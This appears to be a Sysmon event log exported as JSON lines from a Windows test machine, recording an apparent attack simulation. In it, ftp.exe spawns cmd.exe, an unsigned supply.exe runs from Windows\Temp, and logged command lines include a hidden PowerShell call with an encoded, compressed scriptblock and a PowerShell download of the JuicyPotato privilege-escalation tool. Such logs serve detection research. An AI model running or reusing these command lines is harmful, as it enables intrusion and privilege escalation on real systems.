{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CommandLine":"ftp","Company":"Microsoft Corporation","CurrentDirectory":"C:\\Users\\IEUser\\Downloads\\","Description":"File Transfer Program","FileVersion":"10.0.17763.1 (WinBuild.160101.0800)","Hashes":"MD5=F0707986208091066AFD2AB0A73D1693,SHA256=BE279F10D7FF4C18D69724EF0EB04C91D8A34AAC0DB610E638B000991DFB8B02,IMPHASH=F76AC455BB3971C0CB2A43FDCD1FF525","Image":"C:\\Windows\\SysWOW64\\ftp.exe","IntegrityLevel":"Medium","LogonGuid":"747F3D96-DE82-6094-7713-0F0000000000","LogonId":"0xf1377","OriginalFileName":"ftp.exe","ParentCommandLine":"C:\\Windows\\system32\\cmd.exe","ParentImage":"C:\\Windows\\SysWOW64\\cmd.exe","ParentProcessGuid":"747F3D96-3246-6095-B205-000000001D00","ParentProcessId":7152,"ProcessGuid":"747F3D96-324A-6095-B405-000000001D00","ProcessId":7816,"Product":"Microsoft\u00ae Windows\u00ae Operating System","RuleName":"-","TerminalSessionId":1,"User":"MSEDGEWIN10\\IEUser","UtcTime":"2021-05-07 12:27:54.879"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":1,"EventRecordID":2256,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":1,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:27:54.886331Z"}},"Version":5}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CommandLine":"C:\\Windows\\system32\\cmd.exe","Company":"Microsoft Corporation","CurrentDirectory":"C:\\Users\\IEUser\\Downloads\\","Description":"Windows Command Processor","FileVersion":"10.0.17763.1697 (WinBuild.160101.0800)","Hashes":"MD5=DB126FF10E71753C0C29210C090927A3,SHA256=B94D1C553C7EF81DF040D6BE59120EB0A8F67AEC1A787A2B6B537309CBAF8CC4,IMPHASH=392B4D61B1D1DADC1F06444DF258188A","Image":"C:\\Windows\\SysWOW64\\cmd.exe","IntegrityLevel":"Medium","LogonGuid":"747F3D96-DE82-6094-7713-0F0000000000","LogonId":"0xf1377","OriginalFileName":"Cmd.Exe","ParentCommandLine":"ftp","ParentImage":"C:\\Windows\\SysWOW64\\ftp.exe","ParentProcessGuid":"747F3D96-324A-6095-B405-000000001D00","ParentProcessId":7816,"ProcessGuid":"747F3D96-324B-6095-B505-000000001D00","ProcessId":6028,"Product":"Microsoft\u00ae Windows\u00ae Operating System","RuleName":"-","TerminalSessionId":1,"User":"MSEDGEWIN10\\IEUser","UtcTime":"2021-05-07 12:27:55.883"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":1,"EventRecordID":2257,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":1,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:27:55.897014Z"}},"Version":5}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CommandLine":"ftp","Company":"Microsoft Corporation","CurrentDirectory":"C:\\Users\\IEUser\\Downloads\\","Description":"File Transfer Program","FileVersion":"10.0.17763.1 (WinBuild.160101.0800)","Hashes":"MD5=F0707986208091066AFD2AB0A73D1693,SHA256=BE279F10D7FF4C18D69724EF0EB04C91D8A34AAC0DB610E638B000991DFB8B02,IMPHASH=F76AC455BB3971C0CB2A43FDCD1FF525","Image":"C:\\Windows\\SysWOW64\\ftp.exe","IntegrityLevel":"Medium","LogonGuid":"747F3D96-DE82-6094-7713-0F0000000000","LogonId":"0xf1377","OriginalFileName":"ftp.exe","ParentCommandLine":"C:\\Windows\\system32\\cmd.exe","ParentImage":"C:\\Windows\\SysWOW64\\cmd.exe","ParentProcessGuid":"747F3D96-324B-6095-B505-000000001D00","ParentProcessId":6028,"ProcessGuid":"747F3D96-3268-6095-B605-000000001D00","ProcessId":6820,"Product":"Microsoft\u00ae Windows\u00ae Operating System","RuleName":"-","TerminalSessionId":1,"User":"MSEDGEWIN10\\IEUser","UtcTime":"2021-05-07 12:28:24.913"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":1,"EventRecordID":2258,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":1,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:28:24.918865Z"}},"Version":5}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CommandLine":"C:\\windows\\temp\\supply.exe","Company":"-","CurrentDirectory":"C:\\Users\\IEUser\\Downloads\\","Description":"-","FileVersion":"-","Hashes":"MD5=E253708011D4153D7764EC1B3CBC019F,SHA256=B896CC820879C983970829D81667BB69DA2567E942E9228AB68D64EDF550A77A,IMPHASH=4DF47BD79D7FE79953651A03293F0E8F","Image":"C:\\Windows\\Temp\\supply.exe","IntegrityLevel":"Medium","LogonGuid":"747F3D96-DE82-6094-7713-0F0000000000","LogonId":"0xf1377","OriginalFileName":"-","ParentCommandLine":"ftp","ParentImage":"C:\\Windows\\SysWOW64\\ftp.exe","ParentProcessGuid":"747F3D96-3268-6095-B605-000000001D00","ParentProcessId":6820,"ProcessGuid":"747F3D96-326B-6095-B705-000000001D00","ProcessId":2860,"Product":"-","RuleName":"-","TerminalSessionId":1,"User":"MSEDGEWIN10\\IEUser","UtcTime":"2021-05-07 12:28:27.155"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":1,"EventRecordID":2259,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":1,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:28:27.160756Z"}},"Version":5}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CreationUtcTime":"2021-05-07 12:28:27.212","Image":"C:\\windows\\temp\\supply.exe","ProcessGuid":"747F3D96-326B-6095-B705-000000001D00","ProcessId":2860,"RuleName":"DLL","TargetFilename":"C:\\Users\\IEUser\\AppData\\Local\\Temp\\_MEI28602\\msvcm90.dll","UtcTime":"2021-05-07 12:28:27.212"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":11,"EventRecordID":2260,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":11,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:28:27.230825Z"}},"Version":2}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CreationUtcTime":"2021-05-07 12:28:27.228","Image":"C:\\windows\\temp\\supply.exe","ProcessGuid":"747F3D96-326B-6095-B705-000000001D00","ProcessId":2860,"RuleName":"DLL","TargetFilename":"C:\\Users\\IEUser\\AppData\\Local\\Temp\\_MEI28602\\msvcp90.dll","UtcTime":"2021-05-07 12:28:27.228"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":11,"EventRecordID":2261,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":11,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:28:27.230852Z"}},"Version":2}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CreationUtcTime":"2021-05-07 12:28:27.228","Image":"C:\\windows\\temp\\supply.exe","ProcessGuid":"747F3D96-326B-6095-B705-000000001D00","ProcessId":2860,"RuleName":"DLL","TargetFilename":"C:\\Users\\IEUser\\AppData\\Local\\Temp\\_MEI28602\\msvcr90.dll","UtcTime":"2021-05-07 12:28:27.228"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":11,"EventRecordID":2262,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":11,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:28:27.263330Z"}},"Version":2}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CreationUtcTime":"2021-05-07 12:28:27.243","Image":"C:\\windows\\temp\\supply.exe","ProcessGuid":"747F3D96-326B-6095-B705-000000001D00","ProcessId":2860,"RuleName":"DLL","TargetFilename":"C:\\Users\\IEUser\\AppData\\Local\\Temp\\_MEI28602\\python27.dll","UtcTime":"2021-05-07 12:28:27.243"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":11,"EventRecordID":2263,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":11,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:28:27.263432Z"}},"Version":2}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CommandLine":"C:\\windows\\temp\\supply.exe","Company":"-","CurrentDirectory":"C:\\Users\\IEUser\\Downloads\\","Description":"-","FileVersion":"-","Hashes":"MD5=E253708011D4153D7764EC1B3CBC019F,SHA256=B896CC820879C983970829D81667BB69DA2567E942E9228AB68D64EDF550A77A,IMPHASH=4DF47BD79D7FE79953651A03293F0E8F","Image":"C:\\Windows\\Temp\\supply.exe","IntegrityLevel":"Medium","LogonGuid":"747F3D96-DE82-6094-7713-0F0000000000","LogonId":"0xf1377","OriginalFileName":"-","ParentCommandLine":"C:\\windows\\temp\\supply.exe","ParentImage":"C:\\Windows\\Temp\\supply.exe","ParentProcessGuid":"747F3D96-326B-6095-B705-000000001D00","ParentProcessId":2860,"ProcessGuid":"747F3D96-326B-6095-B805-000000001D00","ProcessId":5212,"Product":"-","RuleName":"-","TerminalSessionId":1,"User":"MSEDGEWIN10\\IEUser","UtcTime":"2021-05-07 12:28:27.264"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":1,"EventRecordID":2264,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":1,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:28:27.267611Z"}},"Version":5}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CommandLine":"C:\\Windows\\system32\\cmd.exe","Company":"Microsoft Corporation","CurrentDirectory":"C:\\Users\\IEUser\\Downloads\\","Description":"Windows Command Processor","FileVersion":"10.0.17763.1697 (WinBuild.160101.0800)","Hashes":"MD5=DB126FF10E71753C0C29210C090927A3,SHA256=B94D1C553C7EF81DF040D6BE59120EB0A8F67AEC1A787A2B6B537309CBAF8CC4,IMPHASH=392B4D61B1D1DADC1F06444DF258188A","Image":"C:\\Windows\\SysWOW64\\cmd.exe","IntegrityLevel":"Medium","LogonGuid":"747F3D96-DE82-6094-7713-0F0000000000","LogonId":"0xf1377","OriginalFileName":"Cmd.Exe","ParentCommandLine":"\"powershell.exe\" -nop -w hidden -c &([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String('H4sIAPgilWACA7VW+2+bSBD+OZHyP6DKkkF1DH5cm0SqdAs2No1xcPDbtaoNrPHWC+vCEsft9X+/wYY0VZO79qRDfuxjZnbmm29nWKWRJyiPJNEj0tez0xMHxziU5FJQr0glL3RHpnJyAuslPG9cSO8keYG22xYPMY2WV1dGGsckEsd5tUMEShIS3jFKElmR/pImaxKT85u7T8QT0lep9LHaYfwOs1xsb2BvTaRzFPnZXo97OHOm6m4ZFXL5w4eysjivLavtzylmiVx294kgYdVnrKxI35TswOF+S+SyTb2YJ3wlqhMaNerVUZTgFemDtXtiE7HmflJWIAr4xESkcSQd4skMHLflMgydmHvI92OSJOWKtMhML5bLP+VFfu5tGgkakqoVCRLzrUvie+qRpNrFkc/ILVktQcsVMY2CpaKA2D3fELkUpYxVpN8xI/fJrkDtV5Xkp0og5YhYqUAin4nT5n7KyFGz/IyjkHwFnkcCAHLfzk7PTlcFWTZ32/bHp3SB0cniMCbgnuzwhB4E30laRbLhICx4vIdpaRinRFk+giuVkk+Vl7VrhSgIBuFNSmFtMebUX4JOntAS34+u69nGy8xskRWNSGsf4ZB6Bfnk52AmK0YOQVYLsT64JZfzDeK3CCMBFhlwWbZ/UmuHVDzq6illPomRB6lKwCvIovKjM8dcyGUrskkIGB3nQL/SCihPCumc5vvi9GwOQmWD4SSpSE4Kd86rSC7BjPgVCUUJzbdQKvhhWP7urp0yQT2ciMLcUnkEMj/Q4FEi4tSDvEHwQ3dLPIpZhkVF6lKf6HuXBsXB5WeRMDBjcBXA0j1kAlYyBFyRsSEGHyHzStUlwgq3jIQgcbj7JsMB3PSc7gfy4ID45Z8cLPh8JG+GRQHCE/cgwS7joiKNaSyghmS4Hnj0X45/UjyOjhgxyVMhF1dkoe9FxutS7NsZJXNUDhjEAuI3Yx7qOCFvmsdCIb9Sb6iD4JlZEbP99xtas3bwteE7slcXjtB4SBsWtz0jcTrmBaK7YOdd9JHnv/fJpTtuCrdtCcNB3QHV9Oba07UhjEeWmFmWsDqoO1x7THPaYa9vJQ/qrjvJbB1teM1md6qhRqN509A2ANyM1oIN8vsh3T30YAwV8aanW4muWaz93ri9m9TN+YR11aa5Xk144r6ZtVRVvfRxy94jpHO/Ye+ntVs+7Hqh3oy4emk0N6iNkBG1x6bOr2d6jBx1jIMt310HulEPDISGLiXzwcjUBwNTR6POp8+tSzVQLydTvNYn4zqdb6e3a5ibu+7gWtWalk++8PkOgOtwhINbkAmMurdegUzrNdJf93lSxxudIx1kzPln1FnPtqbDYH84qnM0Zv0pRr353lTV2sxpoq7GJ50ADUAcB/oAo+S+9aWl1sY+9yd/9GcrdTxlb9WWMXDW0yxmdRtmv7tu69qb13bezduL3oSOQ45Gqjp+lXEGSFP6Ej5hwkt13MZxssYMGAIFuriWJo/NvOY6nGYaspw16g2JI8Kgz0EnLKiNGONeVvGPxRnazbEJZD1pBMNG/dmRIj0KKt9bQbF0dTUHL+GyAJ2rPRIFYl3RHhqaBmVde2hqEOKvB2bw7V7OLFWyrgCw5HbZwa6SXZ8Ss1f/K1j5lV3Dn/+vYH1f+4fdXwJQq2Th/rT448Jvgfm7gU8wFSDoQslh5NjzXog/58WT9wJICmR9lT/Ze91NKs778LZwdvo3FKWIS0EKAAA='))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))","ParentImage":"C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe","ParentProcessGuid":"747F3D96-308D-6095-D004-000000001D00","ParentProcessId":2552,"ProcessGuid":"747F3D96-327C-6095-B905-000000001D00","ProcessId":6172,"Product":"Microsoft\u00ae Windows\u00ae Operating System","RuleName":"-","TerminalSessionId":1,"User":"MSEDGEWIN10\\IEUser","UtcTime":"2021-05-07 12:28:44.812"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":1,"EventRecordID":2265,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":1,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:28:44.815186Z"}},"Version":5}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CommandLine":"ftp","Company":"Microsoft Corporation","CurrentDirectory":"C:\\Users\\IEUser\\Downloads\\","Description":"File Transfer Program","FileVersion":"10.0.17763.1 (WinBuild.160101.0800)","Hashes":"MD5=F0707986208091066AFD2AB0A73D1693,SHA256=BE279F10D7FF4C18D69724EF0EB04C91D8A34AAC0DB610E638B000991DFB8B02,IMPHASH=F76AC455BB3971C0CB2A43FDCD1FF525","Image":"C:\\Windows\\SysWOW64\\ftp.exe","IntegrityLevel":"Medium","LogonGuid":"747F3D96-DE82-6094-7713-0F0000000000","LogonId":"0xf1377","OriginalFileName":"ftp.exe","ParentCommandLine":"C:\\Windows\\system32\\cmd.exe","ParentImage":"C:\\Windows\\SysWOW64\\cmd.exe","ParentProcessGuid":"747F3D96-327C-6095-B905-000000001D00","ParentProcessId":6172,"ProcessGuid":"747F3D96-3287-6095-BB05-000000001D00","ProcessId":8200,"Product":"Microsoft\u00ae Windows\u00ae Operating System","RuleName":"-","TerminalSessionId":1,"User":"MSEDGEWIN10\\IEUser","UtcTime":"2021-05-07 12:28:55.879"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":1,"EventRecordID":2266,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":1,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:28:55.884853Z"}},"Version":5}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CommandLine":"C:\\windows\\temp\\supply.exe","Company":"-","CurrentDirectory":"C:\\Users\\IEUser\\Downloads\\","Description":"-","FileVersion":"-","Hashes":"MD5=E253708011D4153D7764EC1B3CBC019F,SHA256=B896CC820879C983970829D81667BB69DA2567E942E9228AB68D64EDF550A77A,IMPHASH=4DF47BD79D7FE79953651A03293F0E8F","Image":"C:\\Windows\\Temp\\supply.exe","IntegrityLevel":"Medium","LogonGuid":"747F3D96-DE82-6094-7713-0F0000000000","LogonId":"0xf1377","OriginalFileName":"-","ParentCommandLine":"ftp","ParentImage":"C:\\Windows\\SysWOW64\\ftp.exe","ParentProcessGuid":"747F3D96-3287-6095-BB05-000000001D00","ParentProcessId":8200,"ProcessGuid":"747F3D96-3289-6095-BC05-000000001D00","ProcessId":8220,"Product":"-","RuleName":"-","TerminalSessionId":1,"User":"MSEDGEWIN10\\IEUser","UtcTime":"2021-05-07 12:28:57.348"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":1,"EventRecordID":2267,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":1,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:28:57.366295Z"}},"Version":5}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CreationUtcTime":"2021-05-07 12:28:57.384","Image":"C:\\windows\\temp\\supply.exe","ProcessGuid":"747F3D96-3289-6095-BC05-000000001D00","ProcessId":8220,"RuleName":"DLL","TargetFilename":"C:\\Users\\IEUser\\AppData\\Local\\Temp\\_MEI82202\\msvcm90.dll","UtcTime":"2021-05-07 12:28:57.384"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":11,"EventRecordID":2268,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":11,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:28:57.400603Z"}},"Version":2}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CreationUtcTime":"2021-05-07 12:28:57.384","Image":"C:\\windows\\temp\\supply.exe","ProcessGuid":"747F3D96-3289-6095-BC05-000000001D00","ProcessId":8220,"RuleName":"DLL","TargetFilename":"C:\\Users\\IEUser\\AppData\\Local\\Temp\\_MEI82202\\msvcp90.dll","UtcTime":"2021-05-07 12:28:57.384"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":11,"EventRecordID":2269,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":11,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:28:57.400631Z"}},"Version":2}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CreationUtcTime":"2021-05-07 12:28:57.400","Image":"C:\\windows\\temp\\supply.exe","ProcessGuid":"747F3D96-3289-6095-BC05-000000001D00","ProcessId":8220,"RuleName":"DLL","TargetFilename":"C:\\Users\\IEUser\\AppData\\Local\\Temp\\_MEI82202\\msvcr90.dll","UtcTime":"2021-05-07 12:28:57.400"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":11,"EventRecordID":2270,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":11,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:28:57.405361Z"}},"Version":2}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CreationUtcTime":"2021-05-07 12:28:57.416","Image":"C:\\windows\\temp\\supply.exe","ProcessGuid":"747F3D96-3289-6095-BC05-000000001D00","ProcessId":8220,"RuleName":"DLL","TargetFilename":"C:\\Users\\IEUser\\AppData\\Local\\Temp\\_MEI82202\\python27.dll","UtcTime":"2021-05-07 12:28:57.416"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":11,"EventRecordID":2271,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":11,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:28:57.420559Z"}},"Version":2}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CommandLine":"C:\\windows\\temp\\supply.exe","Company":"-","CurrentDirectory":"C:\\Users\\IEUser\\Downloads\\","Description":"-","FileVersion":"-","Hashes":"MD5=E253708011D4153D7764EC1B3CBC019F,SHA256=B896CC820879C983970829D81667BB69DA2567E942E9228AB68D64EDF550A77A,IMPHASH=4DF47BD79D7FE79953651A03293F0E8F","Image":"C:\\Windows\\Temp\\supply.exe","IntegrityLevel":"Medium","LogonGuid":"747F3D96-DE82-6094-7713-0F0000000000","LogonId":"0xf1377","OriginalFileName":"-","ParentCommandLine":"C:\\windows\\temp\\supply.exe","ParentImage":"C:\\Windows\\Temp\\supply.exe","ParentProcessGuid":"747F3D96-3289-6095-BC05-000000001D00","ParentProcessId":8220,"ProcessGuid":"747F3D96-3289-6095-BD05-000000001D00","ProcessId":8232,"Product":"-","RuleName":"-","TerminalSessionId":1,"User":"MSEDGEWIN10\\IEUser","UtcTime":"2021-05-07 12:28:57.432"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":1,"EventRecordID":2272,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":1,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:28:57.435332Z"}},"Version":5}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CommandLine":"C:\\windows\\temp\\supply.exe /c \"powershell -c INvoke-WebRequest -Uri https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe -OutFile C:\\Windows\\Temp\\juice.exe\"\n","Company":"-","CurrentDirectory":"C:\\Users\\IEUser\\Downloads\\","Description":"-","FileVersion":"-","Hashes":"MD5=E253708011D4153D7764EC1B3CBC019F,SHA256=B896CC820879C983970829D81667BB69DA2567E942E9228AB68D64EDF550A77A,IMPHASH=4DF47BD79D7FE79953651A03293F0E8F","Image":"C:\\Windows\\Temp\\supply.exe","IntegrityLevel":"Medium","LogonGuid":"747F3D96-DE82-6094-7713-0F0000000000","LogonId":"0xf1377","OriginalFileName":"-","ParentCommandLine":"C:\\windows\\temp\\supply.exe","ParentImage":"C:\\Windows\\Temp\\supply.exe","ParentProcessGuid":"747F3D96-3289-6095-BD05-000000001D00","ParentProcessId":8232,"ProcessGuid":"747F3D96-3289-6095-BE05-000000001D00","ProcessId":8244,"Product":"-","RuleName":"-","TerminalSessionId":1,"User":"MSEDGEWIN10\\IEUser","UtcTime":"2021-05-07 12:28:57.679"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":1,"EventRecordID":2273,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":1,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:28:57.682858Z"}},"Version":5}}
